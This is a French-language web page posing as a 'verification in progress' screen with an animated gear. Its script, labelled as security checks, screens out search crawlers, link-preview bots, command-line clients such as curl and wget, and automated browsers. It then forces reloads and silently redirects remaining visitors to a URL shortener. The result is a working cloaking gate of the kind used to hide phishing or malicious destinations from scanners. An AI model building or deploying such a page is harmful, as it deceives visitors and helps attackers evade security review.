<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<title>Vérification…</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=DM+Mono&family=Syne:wght@700&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: #f5f5f2;
    font-family: 'DM Mono', monospace;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .card {
    text-align: center;
    padding: 20px;
    animation: fadeIn 0.5s ease both;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  .gear-wrapper {
    position: relative;
    width: 100px;
    height: 100px;
    margin: 0 auto 28px;
  }

  canvas {
    position: absolute;
    top: 0; left: 0;
  }

  h1 {
    font-family: 'Syne', sans-serif;
    font-size: 17px;
    font-weight: 700;
    color: #1a1a1a;
    margin-bottom: 6px;
  }

  .subtitle {
    font-size: 11.5px;
    color: #999;
    line-height: 1.7;
  }

  .error-box {
    margin-top: 20px;
    border: 1px solid #ddd;
    background: #fff;
    padding: 12px 16px;
    font-size: 11.5px;
    color: #aaa;
    line-height: 1.7;
    max-width: 260px;
    display: none;
  }

  noscript .error-box { display: block; }
</style>
</head>
<body>
<div class="card" id="card">

  <div class="gear-wrapper">
    <canvas id="gearCanvas" width="100" height="100"></canvas>
  </div>

  <h1>Vérification en cours</h1>
  <p class="subtitle">Veuillez patienter quelques instants…</p>

  <noscript>
    <div class="error-box">
      JavaScript est requis. Veuillez l'activer dans les paramètres de votre navigateur.
    </div>
  </noscript>

</div>

<script>
/* ── Gear renderer ─────────────────────────────────── */
(function () {
  const canvas = document.getElementById('gearCanvas');
  const ctx    = canvas.getContext('2d');
  let angle    = 0;

  function gearPath(cx, cy, r, teeth, toothH, holeR) {
    const step = (Math.PI * 2) / teeth;
    const half = step * 0.35;
    ctx.beginPath();
    for (let i = 0; i < teeth; i++) {
      const a = i * step;
      ctx.arc(cx, cy, r,       a - half, a + half);
      ctx.arc(cx, cy, r + toothH, a + half, a + step - half);
    }
    ctx.closePath();
    // hole
    ctx.moveTo(cx + holeR, cy);
    ctx.arc(cx, cy, holeR, 0, Math.PI * 2, true);
  }

  function drawFrame() {
    ctx.clearRect(0, 0, 100, 100);
    ctx.strokeStyle = '#1a1a1a';
    ctx.lineWidth   = 1.6;
    ctx.fillStyle   = '#f5f5f2';

    // Big gear – centre 42,42 radius 28 teeth 10
    ctx.save();
    ctx.translate(42, 42);
    ctx.rotate(angle);
    ctx.translate(-42, -42);
    gearPath(42, 42, 22, 10, 6, 7);
    ctx.fill();
    ctx.stroke();
    ctx.restore();

    // Small gear – centre 72,72 radius 16 teeth 6
    // gear ratio : big/small = 10/6, opposite direction
    const smallAngle = -angle * (10 / 6);
    ctx.save();
    ctx.translate(72, 72);
    ctx.rotate(smallAngle);
    ctx.translate(-72, -72);
    gearPath(72, 72, 12, 6, 5, 4);
    ctx.fill();
    ctx.stroke();
    ctx.restore();

    angle += 0.012;
    requestAnimationFrame(drawFrame);
  }

  drawFrame();
})();

/* ── Security checks ───────────────────────────────── */
(function () {
  'use strict';

  const REDIRECT_URL = "https://www.shorturl.at/";
  const MIN_DELAY    = 3500;
  const COOKIE_NAME  = "__sv_ok";
  const LS_KEY       = "__sv_ts";

  const BOT_AGENTS = [
    'bot','crawl','spider','slurp','mediapartners',
    'googlebot','bingbot','yandex','duckduckbot',
    'facebookexternalhit','facebot','twitterbot','linkedinbot',
    'telegrambot','whatsapp','discordbot',
    'curl','wget','python-requests','python-urllib',
    'java/','scrapy','httpclient','go-http-client',
    'axios','node-fetch','libwww','perl'
  ];

  function setCookie(name, value, minutes) {
    const d = new Date();
    d.setTime(d.getTime() + minutes * 60000);
    document.cookie = `${name}=${value}; path=/; SameSite=Strict; expires=${d.toUTCString()}`;
  }

  function getCookie(name) {
    return document.cookie.split('; ').find(r => r.startsWith(name + '='));
  }

  function abort() {
    document.getElementById('card').innerHTML =
      '<p style="font-family:monospace;font-size:12px;color:#ccc">Accès non disponible.</p>';
  }

  function redirect() {
    if (REDIRECT_URL) window.location.replace(REDIRECT_URL);
  }

  function run() {
    const ua = navigator.userAgent.toLowerCase();
    for (const b of BOT_AGENTS) { if (ua.includes(b)) { abort(); return; } }

    if (navigator.webdriver === true)          { abort(); return; }
    if (window.callPhantom || window._phantom) { abort(); return; }

    if (!getCookie(COOKIE_NAME)) {
      setCookie(COOKIE_NAME, '1', 30);
      setTimeout(() => window.location.reload(), 600);
      return;
    }

    const now      = Date.now();
    const firstHit = parseInt(localStorage.getItem(LS_KEY) || '0', 10);

    if (!firstHit) {
      localStorage.setItem(LS_KEY, now);
      setTimeout(() => window.location.reload(), 800);
      return;
    }

    const elapsed = now - firstHit;
    localStorage.removeItem(LS_KEY);
    elapsed < MIN_DELAY ? setTimeout(redirect, MIN_DELAY - elapsed) : redirect();
  }

  setTimeout(run, 200);
})();
</script>
</body>
</html>
